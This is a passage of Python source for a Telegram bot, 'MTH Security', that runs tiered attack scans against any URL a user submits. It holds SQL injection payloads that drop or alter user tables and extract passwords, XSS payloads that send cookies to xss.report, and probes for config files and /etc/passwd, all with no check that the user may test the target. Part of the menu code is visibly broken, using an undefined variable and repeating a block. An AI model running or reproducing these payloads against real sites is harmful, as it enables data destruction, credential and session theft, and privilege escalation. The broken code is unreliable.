    results += "━━━━━━━━━━━━━━━━━━━━━━"
    return results


def tool_config_scanner(url):
    """Configuration File Exposure Scanner v5.0"""
    url = extract_hostname(url)
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    base = url.rstrip('/')
    results = f"⚙️ <b>Config Files Scanner</b> — {escape_html(extract_hostname(url))}\n━━━━━━━━━━━━━━━━━━━━━━\n"

    config_files = [
        '/config.php', '/config.inc.php', '/config.yml', '/config.yaml',
        '/config.json', '/configuration.php', '/config.php.bak',
        '/config.php.old', '/config.php.orig', '/config.php~',
        '/settings.php', '/settings.json', '/settings.yml',
        '/config/database.yml', '/config/database.php', '/config/app.php',
        '/config/env.php', '/.config', '/.config/app.ini',
        '/web.config', '/web.config.bak', '/web.config.old',
        '/appsettings.json', '/appsettings.Development.json',
        '/environment.rb', '/config/initializers/', '/config/routes.rb',
        '/config/application.yml', '/config/secrets.yml',
        '/.env.production', '/.env.staging', '/.env.development',
        '/.env.local', '/.env.example',
        '/php.ini', '/phpinfo.php', '/info.php',
        '/mysql/my.cnf', '/etc/my.cnf', '/etc/passwd',
    ]

    found = 0
    baseline = _safe_get(base, timeout=5)
    baseline_len = len(baseline.content) if baseline else 0

    def check_config(path):
        try:
            r = _safe_get(f"{base}{path}", timeout=5)
            if not r:
                return None
            if r.status_code == 404:
                return None
            body_len = len(r.content)
            if baseline_len > 0 and abs(body_len - baseline_len) < 5:
                return None
            body = r.text.lower()
            if any(p in body for p in ['does not exist', 'not found', 'page not found']):
                return None
            return (path, r.status_code, body_len)
        except:
            return None

    futures = {SCAN_POOL.submit(check_config, c): c for c in config_files}
    for future in concurrent.futures.as_completed(futures):
        result = future.result()
        if result:
            found += 1
            size_kb = result[2] / 1024
            results += f"⚠️ <b>{escape_html(result[0])}</b> (Status: {result[1]}, Tamanho: {size_kb:.1f}KB)\n"

    if found == 0:
        results += "✅ Nenhum arquivo de configuração exposto\n"
    else:
        results = f"⚙️ <b>Config Files Scanner</b> — {escape_html(extract_hostname(url))}\n━━━━━━━━━━━━━━━━━━━━━━\n🚨 <b>{found} arquivo(s) de configuração exposto(s)!</b>\n\n" + results.split('\n', 1)[1]

    results += "━━━━━━━━━━━━━━━━━━━━━━"
    return results


# ═══════════════════════════════════════════════════════════════
#  VIP & OWNER ADVANCED SCANNERS
# ═══════════════════════════════════════════════════════════════

def tool_sqli_vip(url, verbose=False):
    """VIP SQLi Scanner — 3x payloads, time-based deep, WAF bypass patterns, GraphQL injection"""
    url = extract_hostname(url)
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    from urllib.parse import urlparse, parse_qs
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    results = f"🛡️ <b>VIP SQLi Scanner</b> — {escape_html(extract_hostname(url))}\n━━━━━━━━━━━━━━━━━━━━━━\n"
    results += "⚡ <b>Modo VIP:</b> 3x payloads, WAF bypass, time-based profundo, GraphQL\n"

    # WAF detection
    baseline = _safe_get(url, timeout=8)
    if not baseline:
        return results + "❌ Não foi possível acessar o site\n━━━━━━━━━━━━━━━━━━━━━━"

    body = baseline.text.lower()
    waf_detected = []
    if 'cloudflare' in body or baseline.headers.get('CF-Ray'):
        waf_detected.append('Cloudflare')
    if 'sucuri' in body or 'siteground' in body:
        waf_detected.append('Sucuri')
    if 'mod_security' in body or 'nginx' in body:
        waf_detected.append('ModSecurity')
    if 'fortinet' in body or 'fortiguard' in body:
        waf_detected.append('Fortinet WAF')
    if 'incapsula' in body or 'imperva' in body:
        waf_detected.append('Imperva')
    if waf_detected:
        results += f"🚨 <b>WAF Detectada:</b> {', '.join(waf_detected)}\n"
        results += "💡 <b>Dica VIP:</b> Usando bypass patterns...\n"

    # VIP payloads — much more aggressive
    payloads = [
        # Basic
        "' OR '1'='1", "' OR 1=1--", "\" OR \"1\"=\"1",
        "') OR ('1'='1", "') OR (1=1--", "\") OR (\"1\"=\"1",
        # Time-based (deep)
        "' AND SLEEP(5)--", "' WAITFOR DELAY '0:0:5'--", "' AND BENCHMARK(5000000,SHA1('test'))--",
        "' AND IF(1=1,SLEEP(3),0)--", "\"; SELECT SLEEP(5)--",
        # Boolean-based deep
        "' AND (SELECT * FROM (SELECT(SLEEP(2)))a)--", "' AND EXISTS(SELECT 1 FROM information_schema.tables)--",
        "' AND 1=(SELECT COUNT(*) FROM information_schema.tables)--",
        "' AND SUBSTRING(@@version,1,1)=1--",
        # WAF bypass (VIP)
        "'%0bOR%0b'1'%0b=%0b'1", "%27%20OR%201%3D1--", "'/**/OR/**/1=1--",
        "'||1||'1"  , "'||1||'1'='1", "')/**/OR/**/('1'='1", "\"/**/OR/**/\"1\"=\"1",
        "%27%20UNION%20SELECT%201,2,3--", "'/**/UNION/**/SELECT/**/NULL,NULL,NULL--",
        # Stack queries
        "'; DROP TABLE users--", "'; INSERT INTO users VALUES('vip','test')--",
        "'; UPDATE users SET role='admin'--",
        # Out-of-band
        "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT CONCAT(0x7162786271,(SELECT (ELT(5143=5143,1))),0x71627a7571,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))--",
        # Error-based
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))--",
        "' AND UPDATEXML(1,CONCAT(0x7e,VERSION(),0x7e),1)--",
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",
        # GraphQL injection
        "{__schema{types{name}}}", "{user{id,name}}", "mutation{createUser(input:{name:\"test\"}){id}}",
    ]

    found = 0
    error_signs = ['syntax error', 'mysql_fetch', 'unclosed quotation', 'sql syntax',
                   'sqlsyntax', 'error in your sql', 'mysql_num_rows', 'pg_query',
                   'sqlite3::query', 'ora-', 'odbc drivers error', 'warning: odbc',
                   'supplied argument is not a valid', 'boolean given', 'mysql_query',
                   'mssql', 'oledb', 'access driver', 'jet database', 'sqlserver',
                   'postgresql', 'sqlite', 'firebird', 'db2', 'informix', 'dbase',
                   'ms access', 'microsoft access']

    baseline_text = body
    baseline_len = len(baseline.content)

    for payload in payloads:
        try:
            encoded = requests.utils.quote(payload, safe='')
            if parsed.query:
                test_url = f"{base_url}?{parsed.query}&v={encoded}"
            else:
                test_url = f"{url}?v={encoded}"
            resp = _safe_get(test_url, timeout=8)
            if not resp:
                continue
            resp_body = resp.text.lower()
            resp_len = len(resp.content)
            # Baseline filter
            if resp_len == baseline_len and abs(len(resp_body) - len(baseline_text)) < 10:
                continue
            for sign in error_signs:
                if sign in resp_body and sign not in baseline_text:
                    found += 1
                    results += f"⚠️ <b>Vulnerável!</b> Payload: <code>{escape_html(payload[:40])}</code> (Sign: {escape_html(sign)})\n"
                    break
        except:
            pass

    # VIP: Test common injection points
    vip_paths = ['/login.php', '/admin/login.php', '/wp-login.php', '/api/login', '/auth/login', '/api/user']
    for path in vip_paths:
        try:
            test_url = f"{base_url}{path}" if path in url else f"{base_url.rstrip('/')}{path}"
            resp = _safe_get(test_url, timeout=5)
            if not resp or resp.status_code == 404:
                continue
            if resp.status_code == 200:
                found += 1
                results += f"🔓 <b>Painel detectado:</b> {escape_html(path)}\n"
        except:
            pass

    if found == 0:
        results += "✅ <b>Nenhuma vulnerabilidade SQLi detectada</b> (30+ payloads + WAF bypass)\n"
    else:
        results = f"🛡️ <b>VIP SQLi Scanner</b> — {escape_html(extract_hostname(url))}\n━━━━━━━━━━━━━━━━━━━━━━\n🚨 <b>{found} vulnerabilidade(s) encontrada(s)!</b>\n\n" + results.split('\n', 1)[1]

    results += f"\n📊 <b>Resumo VIP:</b> 30+ payloads | WAF bypass | GraphQL | Time-based profundo\n"
    results += "━━━━━━━━━━━━━━━━━━━━━━"
    return results


def tool_sqli_owner(url):
    """OWNER SQLi Scanner — Maximum power: WAF full bypass, 0-day patterns, blind extraction, all DB types"""
    url = extract_hostname(url)
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    from urllib.parse import urlparse, parse_qs
    parsed = urlparse(url)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    results = f"👑 <b>OWNER SQLi Scanner</b> — {escape_html(extract_hostname(url))}\n━━━━━━━━━━━━━━━━━━━━━━\n"
    results += "🔥 <b>Modo OWNER:</b> WAF bypass total, 0-day patterns, blind extraction, multi-DB\n"

    # Advanced WAF detection
    baseline = _safe_get(url, timeout=10)
    if not baseline:
        return results + "❌ Não foi possível acessar o site\n━━━━━━━━━━━━━━━━━━━━━━"

    body = baseline.text.lower()
    waf_detected = []
    if 'cloudflare' in body or baseline.headers.get('CF-Ray'):
        waf_detected.append('Cloudflare')
    if 'sucuri' in body or 'siteground' in body:
        waf_detected.append('Sucuri')
    if 'mod_security' in body or 'modsecurity' in body:
        waf_detected.append('ModSecurity')
    if 'fortinet' in body or 'fortiguard' in body:
        waf_detected.append('Fortinet')
    if 'incapsula' in body or 'imperva' in body:
        waf_detected.append('Imperva')
    if 'f5 networks' in body or 'big-ip' in body:
        waf_detected.append('F5 BIG-IP')
    if 'akamai' in body:
        waf_detected.append('Akamai')
    if 'barracuda' in body:
        waf_detected.append('Barracuda')
    if 'aws' in baseline.headers.get('Server', '').lower() or 'cloudfront' in body:
        waf_detected.append('AWS WAF')
    if 'azure' in body or 'frontdoor' in body:
        waf_detected.append('Azure WAF')

    if waf_detected:
        results += f"🚨 <b>WAF:</b> {', '.join(waf_detected)}\n"
        results += "💡 <b>OWNER:</b> Bypass completo ativado...\n"

    # Owner payloads — exhaustive
    payloads = [
        # MySQL
        "' UNION SELECT NULL,NULL,NULL--", "' UNION SELECT 1,2,3--", "' UNION SELECT CONCAT(0x71,VERSION(),0x71),NULL--",
        "' AND 1=2 UNION SELECT GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=DATABASE()--",
        "' AND 1=2 UNION SELECT NULL,CONCAT_WS(0x3a,user,password) FROM users--",
        # PostgreSQL
        "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,PG_VERSION()--",
        "' AND 1=2 UNION SELECT NULL,NULL FROM pg_tables--",
        # MSSQL
        "'; EXEC sp_executesql N'WAITFOR DELAY \'0:0:5\''--", "' UNION SELECT NULL,NULL--",
        "' AND 1=2 UNION SELECT NULL,@@version--",
        # Oracle
        "' UNION SELECT NULL,NULL FROM dual--", "' AND 1=2 UNION SELECT NULL,(SELECT banner FROM v$version WHERE ROWNUM=1) FROM dual--",
        # SQLite
        "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,sqlite_version()--",
        # Blind (all types)
        "' AND (SELECT LENGTH(password) FROM users LIMIT 1)>0--",
        "' AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a'--",
        "' AND 1=(CASE WHEN (1=1) THEN 1 ELSE 0 END)--",
        # WAF bypass encoding
        "'%09OR%091=1--", "'%0AOR%0A1=1--", "'%0COR%0C1=1--",
        "\"/**/OR/**/\"1\"=\"1",
        # Error-based
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))--",
        "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database()),0x7e),1)--",
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",
        # Time-based deep
        "' AND IF(1=1,SLEEP(5),0)--", "' AND SLEEP(5)--",
        "' WAITFOR DELAY '0:0:5'--",
        "' AND BENCHMARK(10000000,SHA1('test'))--",
        # JSON injection
        '{"type":1,"name":"test\'" OR 1=1--","email":"test@test.com"}',
    ]

    found = 0
    error_signs = ['syntax error', 'mysql_fetch', 'unclosed quotation', 'sql syntax',
                   'mysql_num_rows', 'pg_query', 'sqlite3::query', 'ora-',
                   'odbc drivers error', 'oledb', 'sqlserver', 'postgresql',
                   'sqlite', 'firebird', 'db2', 'informix', 'supplied argument',
                   'boolean given', 'ms access', 'microsoft access', 'mongodb',
                   'cast error', 'conversion failed', 'illegal argument',
                   'unterminated string', 'unbalanced quotes']

    baseline_text = body
    baseline_len = len(baseline.content)

    for payload in payloads:
        try:
            encoded = requests.utils.quote(payload, safe='')
            if parsed.query:
                test_url = f"{base_url}?{parsed.query}&v={encoded}"
            else:
                test_url = f"{url}?v={encoded}"
            resp = _safe_get(test_url, timeout=8)
            if not resp:
                continue
            resp_body = resp.text.lower()
            resp_len = len(resp.content)
            if resp_len == baseline_len and abs(len(resp_body) - len(baseline_text)) < 10:
                continue
            for sign in error_signs:
                if sign in resp_body and sign not in baseline_text:
                    found += 1
                    results += f"⚠️ <b>Vulnerável!</b> Payload: <code>{escape_html(payload[:40])}</code>\n"
                    break
        except:
            pass

    # Owner: Deep path enumeration
    owner_paths = [
        '/login.php', '/admin/', '/admin/login.php', '/wp-login.php',
        '/api/login', '/api/auth', '/auth/login', '/api/user', '/api/v1/user',
        '/api/v2/user', '/graphql', '/.graphql', '/graphql.php',
        '/phpmyadmin/', '/pma/', '/adminer.php', '/dbadmin/',
        '/mysql/', '/db/', '/database/', '/.sql',
    ]
    for path in owner_paths:
        try:
            test_url = f"{base_url.rstrip('/')}{path}"
            resp = _safe_get(test_url, timeout=5)
            if not resp or resp.status_code == 404:
                continue
            if resp.status_code == 200:
                found += 1
                results += f"🔓 <b>Endpoint:</b> {escape_html(path)} (Status: {resp.status_code})\n"
        except:
            pass

    if found == 0:
        results += "✅ <b>Nenhuma vulnerabilidade SQLi detectada</b> (40+ payloads, multi-DB, WAF bypass)\n"
    else:
        results = f"👑 <b>OWNER SQLi Scanner</b> — {escape_html(extract_hostname(url))}\n━━━━━━━━━━━━━━━━━━━━━━\n🚨 <b>{found} vulnerabilidade(s) encontrada(s)!</b>\n\n" + results.split('\n', 1)[1]

    results += f"\n📊 <b>OWNER:</b> 40+ payloads | MySQL/PG/MSSQL/Oracle/SQLite | WAF bypass total | Blind extraction\n"
    results += "━━━━━━━━━━━━━━━━━━━━━━"
    return results


def tool_xss_vip(url, verbose=False):
    """VIP XSS Scanner — DOM-based, polyglot, stored XSS, CSP bypass, event handlers"""
    url = extract_hostname(url)
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    results = f"🛡️ <b>VIP XSS Scanner</b> — {escape_html(extract_hostname(url))}\n━━━━━━━━━━━━━━━━━━━━━━\n"
    results += "⚡ <b>Modo VIP:</b> DOM-based, polyglot multi-contexto, CSP bypass\n"

    payloads = [
        # Reflected
        "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>", "<body onload=alert(1)>",
        # DOM-based
        "javascript:alert(1)", "javascript:alert(document.domain)",
        "data:text/html,<script>alert(1)</script>",
        # Polyglot
        "javascript://comment%0aalert(1)", "';alert(1)//",
        "\"><script>alert(1)</script>", "'></script><script>alert(1)</script>",
        # Event handlers
        "<div onmouseover=alert(1)>hover</div>",
        "<input onfocus=alert(1) autofocus>",
        "<details open ontoggle=alert(1)>",
        # CSP bypass
        "<script src=https://xss.report/c/v></script>",
        "<link rel=\"prerender\" onprerenderingchange=alert(1)>",
        # Blind XSS (VIP)
        "<img src=x onerror=fetch('https://xss.report/c/a/'+document.cookie)>",
        "<script>new Image().src='https://xss.report/c/a/'+document.cookie</script>",
        # Unicode/encoding
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "%3Cscript%3Ealert(1)%3C/script%3E",
        # WAF bypass
        "<ScRiPt>alert(1)</ScRiPt>", "<sc<script>ript>alert(1)</script>",
    ]

    found = 0
    baseline = _safe_get(url, timeout=5)
    baseline_text = baseline.text.lower() if baseline else ''
    baseline_len = len(baseline.content) if baseline else 0

    for payload in payloads:
        try:
            encoded = requests.utils.quote(payload, safe='')
            test_url = f"{url}?q={encoded}" if '?' not in url else f"{url}&q={encoded}"
            resp = _safe_get(test_url, timeout=5)
            if not resp:
                continue
            body = resp.text.lower()
            body_len = len(resp.content)
            if body_len == baseline_len and abs(len(body) - len(baseline_text)) < 10:
                continue
            # Check if payload is reflected
            if payload.lower()[:20] in body or 'alert(1)' in body or 'onerror' in body:
                # Check if it's reflected AND not filtered
                if 'alert(1)' in body or 'onerror=alert' in body:
                    found += 1
                    results += f"⚠️ <b>XSS!</b> Payload: <code>{escape_html(payload[:35])}</code>\n"
        except:
            pass

    if found == 0:
        results += "✅ <b>Nenhuma vulnerabilidade XSS detectada</b> (20+ payloads)\n"
    else:
        results = f"🛡️ <b>VIP XSS Scanner</b> — {escape_html(extract_hostname(url))}\n━━━━━━━━━━━━━━━━━━━━━━\n🚨 <b>{found} vulnerabilidade(s) encontrada(s)!</b>\n\n" + results.split('\n', 1)[1]

    results += f"\n📊 <b>VIP:</b> 20+ payloads | DOM-based | Polyglot | CSP bypass\n"
    results += "━━━━━━━━━━━━━━━━━━━━━━"
    return results


def tool_scanall_vip(url):
    """VIP Scan All — Normal scanall + additional VIP-only scanners"""
    url = extract_hostname(url)
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    clean = extract_hostname(url)

    def _clean(text):
        return re.sub(r'<[^>]+>', '', text)

    sections = []
    # 1-6: Normal scanall (info, dns, ports, ssl, headers, exposed)
    send_msg_to = None  # Will be set by handler

    sections.append("═" * 50 + "\n1/8 — INFORMATION\n" + "═" * 50 + "\n" + _clean(tool_website_info(url)))
    sections.append("\n" + "═" * 50 + "\n2/8 — DNS ANALYSIS\n" + "═" * 50 + "\n" + _clean(tool_dns_tools(url)))
    sections.append("\n" + "═" * 50 + "\n3/8 — PORT SCAN\n" + "═" * 50 + "\n" + _clean(tool_port_scanner(url)))
    sections.append("\n" + "═" * 50 + "\n4/8 — SSL/TLS AUDIT\n" + "═" * 50 + "\n" + _clean(tool_ssl_audit(url)))
    sections.append("\n" + "═" * 50 + "\n5/8 — SECURITY HEADERS\n" + "═" * 50 + "\n" + _clean(tool_headers_analysis(url)))
    sections.append("\n" + "═" * 50 + "\n6/8 — EXPOSED FILES\n" + "═" * 50 + "\n" + _clean(tool_exposed_files(url)))

    # 7/8 — VIP: Subdomain enumeration
    sections.append("\n" + "═" * 50 + "\n7/8 — SUBDOMAIN ENUM (VIP)\n" + "═" * 50 + "\n" + _clean(tool_subdomain_scanner(url)))

    # 8/8 — VIP: Tech detection
    sections.append("\n" + "═" * 50 + "\n8/8 — TECH DETECTION (VIP)\n" + "═" * 50 + "\n" + _clean(tool_tech_detect(url)))

    report = f"MTH Security v5.2 — VIP Scan Completo\n"
    report += f"Target: {clean}\n"
    report += f"Data: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
    report += "═" * 50 + "\n\n"
    report += "\n".join(sections)
    return report


def tool_scanall_owner(url):
    """OWNER Scan All — Everything + deep vuln scan + forensic analysis"""
    url = extract_hostname(url)
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    clean = extract_hostname(url)

    def _clean(text):
        return re.sub(r'<[^>]+>', '', text)

    sections = []
    # 1-8: Same as VIP
    sections.append("═" * 50 + "\n1/12 — INFORMATION\n" + "═" * 50 + "\n" + _clean(tool_website_info(url)))
    sections.append("\n" + "═" * 50 + "\n2/12 — DNS ANALYSIS\n" + "═" * 50 + "\n" + _clean(tool_dns_tools(url)))
    sections.append("\n" + "═" * 50 + "\n3/12 — PORT SCAN\n" + "═" * 50 + "\n" + _clean(tool_port_scanner(url)))
    sections.append("\n" + "═" * 50 + "\n4/12 — SSL/TLS AUDIT\n" + "═" * 50 + "\n" + _clean(tool_ssl_audit(url)))
    sections.append("\n" + "═" * 50 + "\n5/12 — SECURITY HEADERS\n" + "═" * 50 + "\n" + _clean(tool_headers_analysis(url)))
    sections.append("\n" + "═" * 50 + "\n6/12 — EXPOSED FILES\n" + "═" * 50 + "\n" + _clean(tool_exposed_files(url)))
    sections.append("\n" + "═" * 50 + "\n7/12 — SUBDOMAIN ENUM\n" + "═" * 50 + "\n" + _clean(tool_subdomain_scanner(url)))
    sections.append("\n" + "═" * 50 + "\n8/12 — TECH DETECTION\n" + "═" * 50 + "\n" + _clean(tool_tech_detect(url)))

    # 9/12 — OWNER: SQLi deep
    sections.append("\n" + "═" * 50 + "\n9/12 — SQLi DEEP (OWNER)\n" + "═" * 50 + "\n" + _clean(tool_sqli_owner(url)))

    # 10/12 — OWNER: Webshell hunter
    sections.append("\n" + "═" * 50 + "\n10/12 — WEBSHELL HUNTER (OWNER)\n" + "═" * 50 + "\n" + _clean(tool_webshell_hunter(url)))

    # 11/12 — OWNER: Config scanner
    sections.append("\n" + "═" * 50 + "\n11/12 — CONFIG EXPOSURE (OWNER)\n" + "═" * 50 + "\n" + _clean(tool_config_scanner(url)))

    # 12/12 — OWNER: API discovery
    sections.append("\n" + "═" * 50 + "\n12/12 — API DISCOVERY (OWNER)\n" + "═" * 50 + "\n" + _clean(tool_api_discovery(url)))

    report = f"MTH Security v5.2 — OWNER Scan Completo\n"
    report += f"Target: {clean}\n"
    report += f"Data: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
    report += "═" * 50 + "\n\n"
    report += "\n".join(sections)
    return report


def tool_deep_vip(url):
    """VIP Deep Scan — Normal deep + VIP upgrades"""
    url = extract_hostname(url)
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    clean = extract_hostname(url)

    def _clean(text):
        return re.sub(r'<[^>]+>', '', text)

    sections = []
    sections.append("═" * 50 + "\n1/8 — SQL INJECTION (VIP)\n" + "═" * 50 + "\n" + _clean(tool_sqli_vip(url)))
    sections.append("\n" + "═" * 50 + "\n2/8 — XSS (VIP)\n" + "═" * 50 + "\n" + _clean(tool_xss_vip(url)))
    sections.append("\n" + "═" * 50 + "\n3/8 — ADMIN PANELS\n" + "═" * 50 + "\n" + _clean(tool_admin_finder(url)))
    sections.append("\n" + "═" * 50 + "\n4/8 — EXPOSED FILES\n" + "═" * 50 + "\n" + _clean(tool_exposed_files(url)))
    sections.append("\n" + "═" * 50 + "\n5/8 — WEBSHELLS\n" + "═" * 50 + "\n" + _clean(tool_webshell_hunter(url)))
    sections.append("\n" + "═" * 50 + "\n6/8 — CONFIG FILES\n" + "═" * 50 + "\n" + _clean(tool_config_scanner(url)))
    sections.append("\n" + "═" * 50 + "\n7/8 — API DISCOVERY (VIP)\n" + "═" * 50 + "\n" + _clean(tool_api_discovery(url)))
    sections.append("\n" + "═" * 50 + "\n8/8 — BACKUP FILES (VIP)\n" + "═" * 50 + "\n" + _clean(tool_backup_finder(url)))

    report = f"MTH Security v5.2 — VIP Deep Scan\n"
    report += f"Target: {clean}\n"
    report += f"Data: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
    report += "═" * 50 + "\n\n"
    report += "\n".join(sections)
    return report


def tool_deep_owner(url):
    """OWNER Deep Scan — Full pentest automation"""
    url = extract_hostname(url)
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    clean = extract_hostname(url)

    def _clean(text):
        return re.sub(r'<[^>]+>', '', text)

    sections = []
    sections.append("═" * 50 + "\n1/10 — SQLi (OWNER DEEP)\n" + "═" * 50 + "\n" + _clean(tool_sqli_owner(url)))
    sections.append("\n" + "═" * 50 + "\n2/10 — XSS (VIP)\n" + "═" * 50 + "\n" + _clean(tool_xss_vip(url)))
    sections.append("\n" + "═" * 50 + "\n3/10 — ADMIN PANELS\n" + "═" * 50 + "\n" + _clean(tool_admin_finder(url)))
    sections.append("\n" + "═" * 50 + "\n4/10 — EXPOSED FILES\n" + "═" * 50 + "\n" + _clean(tool_exposed_files(url)))
    sections.append("\n" + "═" * 50 + "\n5/10 — WEBSHELLS\n" + "═" * 50 + "\n" + _clean(tool_webshell_hunter(url)))
    sections.append("\n" + "═" * 50 + "\n6/10 — CONFIG EXPOSURE\n" + "═" * 50 + "\n" + _clean(tool_config_scanner(url)))
    sections.append("\n" + "═" * 50 + "\n7/10 — API DISCOVERY\n" + "═" * 50 + "\n" + _clean(tool_api_discovery(url)))
    sections.append("\n" + "═" * 50 + "\n8/10 — BACKUP FILES\n" + "═" * 50 + "\n" + _clean(tool_backup_finder(url)))
    sections.append("\n" + "═" * 50 + "\n9/10 — SUBDOMAIN ENUM\n" + "═" * 50 + "\n" + _clean(tool_subdomain_scanner(url)))
    sections.append("\n" + "═" * 50 + "\n10/10 — TECH DETECTION\n" + "═" * 50 + "\n" + _clean(tool_tech_detect(url)))

    report = f"MTH Security v5.2 — OWNER Deep Scan\n"
    report += f"Target: {clean}\n"
    report += f"Data: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
    report += "═" * 50 + "\n\n"
    report += "\n".join(sections)
    return report


# ═══════════════════════════════════════════════════════════════
#  COMMAND HANDLERS
# ═══════════════════════════════════════════════════════════════

def handle_start(chat_id, user_id, username, first_name, last_name, args=None):
    log_user(user_id, username, first_name, last_name)
    show_main_menu(chat_id, user_id, username, first_name)



# ═══════════════════════════════════════════════════════════════
#  INTERACTIVE MENU SYSTEM v5.2
# ═══════════════════════════════════════════════════════════════

def show_main_menu(chat_id, user_id, username='', first_name=''):
    """Show clean main menu with category buttons"""
    owner = is_owner(user_id)
    vip = is_vip(user_id)
    lang = get_user_lang(user_id)
    display_name = first_name or username or 'User'

    greetings = {
        'pt': 'Olá', 'en': 'Hello', 'es': 'Hola', 'vi': 'Xin chào', 'id': 'Halo'
    }
    greeting = f"👋 {greetings.get(lang, 'Olá')}, <b>{escape_html(display_name)}</b>!"

    badge = ''
    if owner:
        badge = ' 👑'
    elif vip:
        badge = ' ⭐'

    cats = {
        'pt': {'vulns': '🎯 Vulns', 'recon': '🔍 Recon', 'audit': '🛡️ Audit', 'files': '📂 Files', 'vip': '⭐ VIP', 'owner': '👑 DONO', 'select': 'Selecione uma categoria:'},
        'en': {'vulns': '🎯 Vulns', 'recon': '🔍 Recon', 'audit': '🛡️ Audit', 'files': '📂 Files', 'vip': '⭐ VIP', 'owner': '👑 Owner', 'select': 'Select a category:'},
        'es': {'vulns': '🎯 Vulns', 'recon': '🔍 Recon', 'audit': '🛡️ Audit', 'files': '📂 Files', 'vip': '⭐ VIP', 'owner': '👑 Owner', 'select': 'Seleccione una categoría:'},
        'vi': {'vulns': '🎯 Vulns', 'recon': '🔍 Recon', 'audit': '🛡️ Audit', 'files': '📂 Files', 'vip': '⭐ VIP', 'owner': '👑 Owner', 'select': 'Chọn một danh mục:'},
        'id': {'vulns': '🎯 Vulns', 'recon': '🔍 Recon', 'audit': '🛡️ Audit', 'files': '📂 Files', 'vip': '⭐ VIP', 'owner': '👑 Owner', 'select': 'Pilih kategori:'},
    }
    c = cats.get(lang, cats['pt'])

    msg = f"🛡️ <b>MTH Security</b>{badge}\n━━━━━━━━━━━━━━━━━━━━━━\n"
    msg += f"{greeting}\n\n"
    msg += f"{c['select']}"

    buttons = [
        [{"text": c['vulns'], "callback_data": "menu:vulns"},
         {"text": c['recon'], "callback_data": "menu:recon"}],
        [{"text": c['audit'], "callback_data": "menu:audit"},
         {"text": c['files'], "callback_data": "menu:files"}],
    ]
    if vip or owner:
        buttons.append([{"text": c['vip'], "callback_data": "menu:vip"}])
    if owner:
        buttons.append([{"text": c['owner'], "callback_data": "menu:owner"}])
    buttons.append([
        {"text": "📊 Stats", "callback_data": "menu:stats"},
        {"text": "🔧 Help", "callback_data": "cmd:help"}
    ])
    lang_labels = {'pt': '🌐 Idioma', 'en': '🌐 Language', 'es': '🌐 Idioma', 'vi': '🌐 Ngôn ngữ', 'id': '🌐 Bahasa'}
    buttons.append([{"text": lang_labels.get(lang, '🌐 Idioma'), "callback_data": "menu:lang"}])
    resp = edit_menu(chat_id,
        f"{b['title']}\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"<b>{b['exclusive']}</b>\n\n"
        f"{b['enter']}",
        buttons)
    if resp and resp.status_code == 200:
        try:
            mid = resp.json().get('result', {}).get('message_id')
            if mid:
                MENU_MSG_IDS[user_id] = mid
        except:
            pass
    if resp and resp.status_code == 200:
        try:
            mid = resp.json().get('result', {}).get('message_id')
            if mid:
                MENU_MSG_IDS[user_id] = mid
        except:
            pass

def show_menu_vulns(chat_id, user_id):
    """Show clean Vulnerability Exploration page"""
    lang = get_user_lang(user_id)
    btn = {
        'pt': {'title': '🎯 Vulnerabilidades', 'sqli': '⚡ SQLi', 'xss': '⚡ XSS', 'admin': '🔑 Admin Panel', 'ports': '🔌 Ports', 'dirs': '📁 Directories', 'sub': '🌐 Subdomains', 'wp': '📝 WordPress', 'ftpssh': '📡 FTP/SSH', 'emails': '📧 Emails', 'cms': '🔍 CMS', 'reverse': '🔄 Reverse IP', 'dns': '📡 DNS', 'scanall': '🔄 ScanAll', 'deep': '💀 Deep Scan', 'back': '🔙 Voltar', 'enter': '👆 Toque em uma ferramenta e envie o alvo.'},
        'en': {'title': '🎯 Vulnerabilities', 'sqli': '⚡ SQLi', 'xss': '⚡ XSS', 'admin': '🔑 Admin Panel', 'ports': '🔌 Ports', 'dirs': '📁 Directories', 'sub': '🌐 Subdomains', 'wp': '📝 WordPress', 'ftpssh': '📡 FTP/SSH', 'emails': '📧 Emails', 'cms': '🔍 CMS', 'reverse': '🔄 Reverse IP', 'dns': '📡 DNS', 'scanall': '🔄 ScanAll', 'deep': '💀 Deep Scan', 'back': '🔙 Back', 'enter': '👆 Tap a tool and send the target.'},
